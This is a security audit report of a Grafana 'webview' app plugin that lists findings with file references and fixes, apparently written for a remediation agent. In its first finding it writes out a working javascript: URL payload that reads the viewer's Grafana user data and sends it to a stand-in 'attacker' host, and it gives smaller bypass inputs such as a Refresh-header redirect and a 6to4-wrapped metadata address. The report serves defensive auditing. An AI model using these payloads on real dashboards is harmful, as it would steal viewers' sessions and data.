# Security Review — `wilsonwaters-webview-app` (Grafana Web View app plugin)

**Date:** 2026-06-10
**Scope:** Full plugin — React frontend (panel + app config), Go backend HTTP proxy, plugin manifests, provisioning, build/CI, dependencies, and docs.
**Method:** Orchestrated review. Grafana plugin security model researched from official `grafana.com` plugin-tools docs and relevant CVEs; codebase mapped; three parallel deep-dive audits (backend SSRF/proxy, frontend XSS/iframe, config/CI/supply-chain/docs).
**Audience:** This report is intended to be handed to another agent for remediation. Every finding has a file:line and a concrete fix.

---

## TL;DR

The proxy backend is, for the most part, **unusually well-hardened**: fail-closed (empty) allowlist by default, a hardcoded non-configurable IP blocklist (RFC1918/loopback/link-local/CGNAT/ULA/metadata), DNS-resolve-then-dial-the-IP with a connect-time re-check (DNS-rebinding safe), keep-alives disabled to prevent cross-policy connection reuse, request/response header stripping, rate limiting, redirect re-validation, and a CI-gated SSRF acceptance-test suite (AC17–29). Much of the obvious SSRF attack surface is already closed and was verified safe (see "Verified safe" at the end).

The real risk sits in **two places the hardening does not cover**:

1. **The frontend iframe.** A panel `url` option is written into an iframe `src` with **no scheme validation**, so a `javascript:` URL executes in the **Grafana origin** — exploitable **today** by any dashboard editor against every viewer (VR-1, Critical). Separately, proxy-mode content is served same-origin with `sandbox="allow-scripts allow-same-origin"`, which is the textbook sandbox-escape combination; this is **latent today** (Grafana's own headers currently block proxy-iframe rendering) but becomes **live** the moment the planned `srcdoc` fix lands or embedding/CSP config changes (VR-2, Critical-latent).
2. **Authorization.** Grafana does **not** enforce the `role: Admin` include on `CallResource` endpoints, and no handler checks the user role — so the proxy is reachable by any authenticated Viewer (VR-3, High).

Plus a provisioning file that ships a hardcoded secret and a non-empty allowlist, quietly defeating the fail-closed default (VR-4, High).

| ID | Severity | Title |
|----|----------|-------|
| VR-1 | **Critical** (live) | `javascript:`/`data:` URL in panel option executes in Grafana origin (no scheme validation) |
| VR-2 | **Critical** (latent → live) | Proxy content served same-origin with `allow-scripts allow-same-origin`; HTML not sanitized of active content |
| VR-3 | **High** | No per-user authorization on proxy `CallResource` endpoints — open SSRF/exfil relay for any Viewer |
| VR-4 | **High** | Provisioning ships hardcoded secret + permissive allowlist, defeating fail-closed default |
| VR-5 | Medium | `Refresh` response header not stripped → client-side redirect bypasses per-hop revalidation |
| VR-6 | Medium | gzip-bomb via `/proxy-resource` bypasses the decoded-size cap |
| VR-7 | Medium | Oversize chunked responses stream a truncated `200` instead of `413` |
| VR-8 | Medium | Leftover `/echo` & `/ping` scaffold endpoints bypass the pipeline; `/echo` decodes unbounded bodies |
| VR-9 | Medium | Dev container defaults (anonymous Admin, unsigned-plugin loading) need explicit prod warnings in docs |
| VR-10 | Medium | Transitive npm advisories via `@grafana/*` (dompurify chain) — track, don't force-bump |
| VR-11 | Low | IPv6 6to4 (`2002::/16`) and NAT64 (`64:ff9b::/96`) not in IP blocklist |
| VR-12 | Low | README claims RBAC checks the code does not yet implement (future-tense, hedged) |
| VR-13 | Info | Unused `apiKey`/`apiUrl` scaffold config and provisioning secret should be removed |
| VR-14 | Info | A few Grafana plugin-actions pinned to floating version-branch refs rather than SHAs |

---

## Critical

### VR-1 — `javascript:`/`data:` URL in panel option executes in the Grafana origin (no client-side scheme validation) — **live today**

- **Severity:** Critical (exploitable now; no preconditions beyond a dashboard editor).
- **Files:**
  - `src/panels/webview/components/WebViewPanel.tsx:213` — `renderIframe(opts.url)` for direct mode.
  - `src/panels/webview/components/ViewportEditor.tsx:317` — `src={opts.url}` in the editor preview.
  - `src/types.ts:136` — `normalizeOptions` validates only numeric fields; `url` passes through verbatim.
  - `src/panels/webview/module.tsx:21-26` — plain `addTextInput` for `url`, no validation.
- **Vulnerability:** The `url` panel option is written straight into `<iframe src>` with no scheme check anywhere in `src/`. In view mode the panel never consults the allowlist or `check-frameable`; direct mode needs no backend at all. A `javascript:` URL in an iframe `src` executes in the **embedding (Grafana) origin**; a `data:text/html` URL renders attacker HTML.
- **Exploit (attacker = malicious/compromised dashboard editor, per the stated threat model — an Editor can set arbitrary panel options that every Viewer then loads):** Editor sets `url = javascript:fetch('/api/user',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker/x?'+encodeURIComponent(d)))` with `loadMode: direct`. Every viewer who opens the dashboard runs that script as themselves in the Grafana origin → session/CSRF/API actions as the viewer. It also runs in the editor's own live preview (`ViewportEditor.tsx:317`).
- **Fix:** Add a pure validator (e.g. in `src/panels/webview/loadMode.ts` or `src/types.ts`): parse with `new URL()` and allow **only** `http:` and `https:` (reject `javascript:`, `data:`, `blob:`, `vbscript:`, `file:`, etc.). Enforce it **at render time** in `WebViewPanel` (render the empty/error state instead of an iframe when the scheme is unsafe) and in `ViewportEditor` before binding `src`. Add editor-time feedback in `module.tsx` as a secondary measure. The render-time guard is the security-critical one. Add a unit test covering `javascript:`/`data:` rejection. Grafana's `@grafana/data` `textUtil.sanitizeUrl` can back this.

### VR-2 — Proxy content served same-origin with `sandbox="allow-scripts allow-same-origin"`; proxied HTML not sanitized of active content — **latent today, becomes live with the planned `srcdoc` fix**

- **Severity:** Critical (latent). Currently blocked incidentally by Grafana stamping `X-Frame-Options: deny` + `CSP: sandbox` on resource routes (documented in `ai-state/Q17-proxy-render-headers.md`). Becomes live when (a) the planned fetch-then-`srcdoc` fix lands, (b) `allow_embedding`/CSP config changes, or (c) the Grafana version drifts. This is **not** a control the plugin owns today.
- **Files:**
  - `src/panels/webview/components/WebViewPanel.tsx:166` — single hardcoded `sandbox="allow-scripts allow-same-origin"`, reused by `renderIframe` for both modes.
  - `src/panels/webview/loadMode.ts:58-70` — `buildProxySrc` → `/api/plugins/wilsonwaters-webview-app/resources/proxy?...`, **same-origin to Grafana**.
  - `pkg/plugin/rewrite.go` (whole file) — rewrites URLs but does **not** remove `<script>` elements, inline `on*` event handlers, `javascript:`/`data:` URLs (`rewrite.go:360-364` leaves non-http(s) schemes verbatim), or SVG/MathML script vectors. The frame-buster pass only removes navigation scripts.
  - `ai-state/Q17-proxy-render-headers.md` §4 — the design doc itself flags this exact nuance for the srcdoc plan.
- **Vulnerability:** Serving attacker-influenced HTML from Grafana's own origin while granting both `allow-scripts` and `allow-same-origin` lets scripts in the framed document run **in the Grafana origin**, read `document.cookie`/`localStorage`/`sessionStorage`, call Grafana's authenticated REST API, and reach `window.parent`. With `srcdoc` the frame is unconditionally same-origin, making `allow-same-origin` strictly worse. Because `rewrite.go` does not neutralize active content, any allowlisted page that is attacker-influenced (reflected XSS on an allowlisted host, a compromised allowlisted site, or an allowlisted user-content host) gets full same-origin execution against Grafana for every viewer.
- **Fix (two layers):**
  1. **Per-mode sandbox.** Make the sandbox a computed value, not a single literal. For proxy/`srcdoc` content use `sandbox="allow-scripts"` **without** `allow-same-origin` (opaque origin: scripts run but get no Grafana-origin access). Keep `allow-same-origin` only for genuine cross-origin direct-mode `http(s)` URLs (safe — the frame gets the *external* site's origin). Thread the resolved mode into `renderIframe(src, mode)`. Add a unit test asserting the proxy/srcdoc iframe never carries `allow-same-origin`.
  2. **Neutralize active content in `rewrite.go`** as defense-in-depth: strip/disable `<script>`, drop `on*` attributes, rewrite/strip `javascript:`/`data:` in `href`/`src`/`action`, and set a restrictive `Content-Security-Policy` (e.g. `script-src 'none'`) on the `/proxy` response.
- **Note for the fixing agent:** Do **not** implement the Q17 `srcdoc` change while reusing the shared sandbox literal — that would ship this Critical. Land the per-mode sandbox first.

---

## High

### VR-3 — No per-user authorization on proxy `CallResource` endpoints (open SSRF/exfil relay for any Viewer)

- **Severity:** High.
- **Files:** `pkg/plugin/app.go:57-85`, `pkg/plugin/resources.go:53-65`, `src/plugin.json:32` (`"role": "Admin"` on the *Configuration include only*). Repo-wide grep for `Role`/`IsAdmin`/`RBAC`/`HasAccess` in `*.go` returns nothing.
- **Vulnerability:** Grafana enforces only authentication + basic plugin access on `/api/plugins/<id>/resources/*`; it does **not** enforce the `role` from `includes[]` (that controls nav-menu visibility only — confirmed against official RBAC docs). No handler checks the user role. So any authenticated org user, **including Viewer**, can drive `/proxy`, `/proxy-resource`, and `/check-frameable` against any allowlisted domain — using the plugin as a request-laundering/exfiltration channel (the proxy strips caller identity, so upstream logs attribute everything to the Grafana server) and consuming the shared rate/concurrency budget. The `role: Admin` label is misleading: it gates only the config UI.
- **Fix:** Decide the intended trust model. If the proxy is meant to be usable by anyone who can view a dashboard (a defensible position for a panel), **document it explicitly** in `SECURITY.md` and admin docs: the allowlist + rate limits are the *only* access controls and any authenticated user can reach the proxy. If admin/editor-only proxying is desired, add an explicit role check inside the resource handlers using `backend.PluginConfigFromContext(ctx).User` (role) rather than relying on the include role, or register `reqAction` RBAC. Either way, correct the documentation expectation (see VR-12).

### VR-4 — Provisioning ships a hardcoded secret and a permissive allowlist, defeating the fail-closed default

- **Severity:** High.
- **Files:** `provisioning/plugins/apps.yaml:9` (`secureJsonData.apiKey: secret-key`), `:17-22` (`allowedDomains: [example.com]`, `apiUrl: http://default-url.com`); mounted at `.config/docker-compose-base.yaml:23`.
- **Vulnerability:** The provisioning manifest commits a literal secret and pre-seeds a **non-empty allowlist**. Cloning dev provisioning into production is a common pattern; doing so (a) normalizes secret-in-repo and (b) silently enables the proxy to fetch an external host on a fresh install, defeating the carefully built fail-closed (empty-allowlist) default. The backend never even reads `apiKey` (scaffold leftover).
- **Fix:** Rename to `apps.yaml.example` or move under an explicitly dev/CI-only path; remove the `apiKey` line (or replace with an env-var placeholder like `$WEBVIEW_API_KEY`); add a prominent header comment: "DEV/CI ONLY — production installs must start from an empty allowlist." Ensure install docs tell admins to start empty.

---

## Medium

### VR-5 — `Refresh` response header not stripped → client-side redirect bypasses per-hop revalidation

- **Files:** `pkg/plugin/proxy.go:122-132` (`strippedResponseHeaders`), `:1282-1316` (`stripFramingHeaders`), `:953-1016` (`handleRedirect`).
- **Vulnerability:** Per-hop redirect revalidation is sound for `Location`-based 3xx, but the `Refresh` response header (a browser-honored client-side redirect) is not in the strip list. An allowlisted upstream can return `Refresh: 0; url=https://attacker/` and navigate the framed panel to an un-proxied, non-allowlisted destination, defeating revalidation. (`<meta http-equiv=refresh>` in the body *is* removed at `rewrite.go:421-433`; the header path is the gap.)
- **Fix:** Add `"Refresh"` to `strippedResponseHeaders` (`proxy.go:122-132`).

### VR-6 — gzip-bomb via `/proxy-resource` bypasses the decoded-size cap

- **Files:** `pkg/plugin/proxy.go:1202-1213` (`Accept-Encoding: gzip` pinned on all outbound requests), `:811-817` (`/proxy-resource` streams the gzip body through undecoded), `:859-901` (`enforceResponseSize`); `decodeGzipBounded` runs only for `/proxy` HTML.
- **Vulnerability:** Because the proxy advertises gzip on every upstream request but `/proxy-resource` passes the compressed body straight to the browser, `MaxResponseBytes` bounds only the *compressed* wire bytes — the browser decompresses unbounded. A gzip bomb served as a subresource is a browser-side memory DoS that bypasses the decoded-size guard that protects the HTML path.
- **Fix:** For `/proxy-resource`, either send `Accept-Encoding: identity` (so the wire-size cap equals the decoded size) or decode+rebound gzip subresources under `MaxResponseBytes` like the HTML path.

### VR-7 — Oversize chunked responses stream a truncated `200` instead of `413`

- **Files:** `pkg/plugin/proxy.go:851-901` (`enforceResponseSize`/`limitedBody`).
- **Vulnerability:** For chunked/undeclared-length responses the body is wrapped in `limitedBody`, but headers + `200` are already sent before streaming, so an oversize body is delivered as a *truncated 200* rather than a clean `413`. A malicious allowlisted host can always deliver up-to-limit bytes regardless of declared `Content-Length`. (Documented limitation in the code.)
- **Fix:** Accept as documented, or buffer small responses before committing the status, or signal truncation (e.g. `Connection: close`) so clients can detect the cut.

### VR-8 — Leftover `/echo` & `/ping` scaffold endpoints bypass the pipeline; `/echo` decodes unbounded bodies

- **Files:** `pkg/plugin/resources.go:9-50` (`/ping`, `/health`, `/echo`), `:53-56` (registration). `/echo` does `json.NewDecoder(req.Body).Decode` with no size limit (`:40`). `handlePing`/`handleHealth` call `WriteHeader` *after* `Write` (`:11,:15`) — a no-op bug confirming dead scaffold.
- **Vulnerability:** `/ping`, `/health`, `/echo` bypass rate limiting, concurrency caps, and audit. `/echo` reflects arbitrary POST bodies and decodes unbounded JSON → memory-amplification DoS and a content-reflection gadget on the Grafana origin. These are `create-plugin` template leftovers.
- **Fix:** Remove `/echo` and `/ping` if unused. Keep `/health` (used by the frontend liveness probe) but it needs no body. If any are kept with bodies, bound them with `http.MaxBytesReader` and rate-limit them. Fix the `WriteHeader`-after-`Write` ordering.

### VR-9 — Dev container defaults (anonymous Admin, unsigned-plugin loading) need explicit production warnings in docs

- **Files:** `.config/Dockerfile:17-21` (`GF_AUTH_ANONYMOUS_ORG_ROLE=Admin`, anonymous enabled, basic auth disabled, dev app mode), `.config/docker-compose-base.yaml:12,31`, `docker-compose.yaml:10` (`GF_PLUGINS_ALLOW_LOADING_UNSIGNED_PLUGINS`), `README.md:94` (`admin/admin`).
- **Vulnerability:** Dev-only and acceptable as-is (CI overrides with `ANONYMOUS_AUTH_ENABLED=false DEVELOPMENT=false` at `.github/workflows/ci.yml:221`; the Dockerfile already carries a "do not enable in production" comment). Risk only if someone exposes the dev container or copies these env vars into prod. **`.config/` is tool-managed and must not be edited.**
- **Fix:** No `.config/` change. Add a README/admin-docs note: the bundled Docker Compose enables anonymous Admin and unsigned-plugin loading **for local development only** — never expose it to an untrusted network or reuse its env vars in production; production installs must use the **signed** release artifact and never set `GF_PLUGINS_ALLOW_LOADING_UNSIGNED_PLUGINS`.

### VR-10 — Transitive npm advisories via `@grafana/*` (dompurify chain)

- **Files:** `package.json:70-79` (`@grafana/data|runtime|ui@12.4.2`). `npm audit --omit=dev` ran successfully and reports **high**-severity advisories via `dompurify`, `react-use`, `immutable`, `uuid`; `fixAvailable` only via a semver-major bump (`@grafana/data@13.x`) that would break `grafanaDependency: >=12.3.0`.
- **Vulnerability:** Frontend libs bundled into the panel. The dompurify (sanitizer-bypass) advisory is the most relevant given the plugin renders external HTML, though server-side rewriting (not dompurify) does the proxy sanitization. Not fixable without a Grafana major bump.
- **Fix:** Track `@grafana/*` patch releases (the dependabot `grafana` group already covers minor/patch); take the 12.x patch that pulls a fixed dompurify. Do **not** force the breaking major. Document the accepted risk.

---

## Low / Info

### VR-11 — IPv6 6to4 (`2002::/16`) and NAT64 (`64:ff9b::/96`) not in the IP blocklist
- **File:** `pkg/security/ipblocklist.go:68-119`, `normalize` `:126-140`.
- IPv4-mapped (`::ffff:169.254.169.254`) and IPv4-compatible/`::/8` forms are correctly caught. But `2002:a9fe:a9fe::` (6to4-wrapped `169.254.169.254`) lands in `2002::/16`, which is **not** blocked and does not collapse to IPv4. Low exploitability (resolver must return it and it must route) but a coverage gap vs. the stated "block all internal IPs" intent.
- **Fix:** Add `2002::/16` and `64:ff9b::/96` to `blockedRanges`, or unwrap 6to4/NAT64-embedded IPv4 in `normalize` and re-classify against the IPv4 ranges.

### VR-12 — README claims RBAC checks the code does not implement
- **File:** `README.md:22` — proxy "will include … Grafana RBAC checks before content is forwarded." No RBAC exists in any handler (see VR-3). Hedged by the "intended design / not all features implemented" note at `:24`, so not an outright false claim, but it must not be promoted to present tense until a real role check exists.
- **Fix:** Keep it future-tense and explicit until VR-3 is resolved; align with whatever trust model is chosen there. When the deferred `SECURITY.md` threat model / admin docs land, state plainly that proxy endpoints are reachable by any authenticated user (the `role: Admin` include hides only the config UI), and instruct prod installs to keep the allowlist empty/explicit, use the signed artifact, and not reuse dev-compose settings.

### VR-13 — Unused `apiKey`/`apiUrl` scaffold config
- **Files:** `src/components/AppConfig/AppConfig.tsx` (`apiKey`/`apiUrl` UI), `provisioning/plugins/apps.yaml:9`. The Go backend never reads them (`config.go` parses only the security `jsonData` fields). `secureJsonData` handling itself is **correct** (write-only, never read back).
- **Fix:** Remove the unused API Key/URL config UI and the provisioning `apiKey` line to avoid confusion and a pointless committed secret (overlaps VR-4).

### VR-14 — A few Grafana plugin-actions pinned to floating version-branch refs
- **Files:** `.github/workflows/*.yml` — e.g. `grafana/plugin-actions/build-plugin@build-plugin/v1.0.2`, `wait-for-grafana@...`, `e2e-version@...`. First-party Grafana actions on version-named refs (lower risk than `@main`). Other third-party actions (`golangci-lint`, `mage-action`, `setup-node`) are correctly SHA-pinned; `actions/checkout` uses `persist-credentials: false`; permissions are narrowly scoped; no `pull_request_target`; no `${{ github.event.* }}` in `run:` blocks; `.npmrc` sets `ignore-scripts=true`; dependabot has a 5-day cooldown.
- **Fix:** Optional — SHA-pin the Grafana actions too for strict supply-chain hygiene. Low priority.

---

## Verified safe — no action needed (so the fixing agent doesn't chase these)

**Backend SSRF pipeline (audited and confirmed correct):**
- Obfuscated IP encodings (decimal/octal/hex) — Go resolver doesn't parse them; they NXDOMAIN and fail closed.
- `::ffff:` IPv4-mapped addresses collapsed via `To4()` and blocked.
- Cloud metadata: AWS/Azure/Alibaba/DO/Oracle all resolve to addresses caught by the link-local / CGNAT / reserved ranges (IP-layer block is authoritative; the GCP name list is supplementary).
- Allowlist label tricks (`evil-example.com`, `example.com.evil.com`) — `isSubdomainOf` enforces a `.` label boundary (`allowlist.go:198-216`).
- Trailing-dot / case / IDN-punycode normalization — both sides use `NormalizeHostname`.
- DNS rebinding — resolve-then-dial-the-literal-IP plus a connect-time `Control` re-check; keep-alives disabled (`proxy.go:264`, `resolvedial.go:340-371`).
- Request header stripping — credentials, forwarding, edge client-IP, and a full `X-Grafana-*` prefix sweep; UA/Accept overwritten after strip (`proxy.go:1180-1213`). Hop-by-hop headers handled by net/http's ReverseProxy.
- `X-Frame-Options` removal is case-insensitive (`Header.Del` canonicalizes); CSP `frame-ancestors` stripping matches case-insensitively.
- Empty-allowlist fail-closed (`MatchHostname` denies on nil/empty); rate-limiter fail-closed on non-positive limits with idempotent release.
- Hide-selector CSS applied via cascadia matching + `SetAttr` (escaped) — selector text never serialized into markup, so no CSS/markup injection.
- `AllowPrivateIP` opt-in relaxes RFC1918 only (never loopback/link-local/metadata) and is re-derived per redirect hop.

**Frontend (audited and confirmed correct):**
- No `dangerouslySetInnerHTML`/`innerHTML`/`eval` anywhere in `src/`. (srcdoc is only a *future* plan — see VR-2.)
- No `postMessage`/`message` listeners — no cross-frame channel, so no origin-validation gap. Iframe is `pointer-events: none`.
- `buildProxySrc` uses `URLSearchParams` — query-param injection not possible; the residual `url` risk is the *scheme* (VR-1), not encoding.
- Viewport/zoom transforms are built from clamped numeric fields only — no string option reaches inline styles, so no CSS breakout.
- `secureJsonData` (`apiKey`) is write-only and never read back/logged; `apiUrl` correctly uses non-secret `jsonData`.
- `referrerPolicy="no-referrer"` is set on both iframes; no over-permissive `allow=` feature-policy attribute.

**CI / supply chain:** No committed secrets/keys; third-party actions SHA-pinned; narrow workflow permissions; no `pull_request_target`; no script-injection vectors; `.npmrc` `ignore-scripts=true`; dependabot cooldown configured.

---

## Suggested remediation order

1. **VR-1** — add the URL scheme allowlist (smallest, highest-leverage; closes the live `javascript:` vector in view *and* editor).
2. **VR-2** — per-mode sandbox (drop `allow-same-origin` for proxy/srcdoc) **before** any `srcdoc` work, plus active-content neutralization in `rewrite.go`.
3. **VR-3 / VR-12** — decide and document the proxy authorization model; add a role check if admin/editor-only is intended.
4. **VR-4 / VR-13** — sanitize provisioning (remove secret, gate as example, empty allowlist); drop unused scaffold config.
5. **VR-5, VR-6, VR-8** — quick backend hardening: strip `Refresh`, bound gzip on `/proxy-resource`, remove `/echo`/`/ping`.
6. **VR-7, VR-9, VR-10, VR-11, VR-14** — documented limitations, docs warnings, dependency tracking, blocklist coverage, action pinning.

## Appendix — reference material used
Grafana plugin security model (backend plugins are unsandboxed native binaries; frontend runs in the Grafana page context; optional Frontend Sandbox ≥11.5; `includes[].role` is nav-visibility only; CallResource authz is the plugin's responsibility), `secureJsonData` vs `jsonData`, SSRF/credential-forwarding guidance, and precedent CVEs in similar embed/HTML panels (AJAX panel removal; Text panel stored XSS CVE-2023-22462; XY Chart DOM XSS CVE-2025-2703; plugin-load XSS→SSRF CVE-2025-4123) — sourced from official `grafana.com` plugin-tools docs and security advisories. Consider recommending operators enable the **Frontend Sandbox** for this plugin, since it embeds external content.
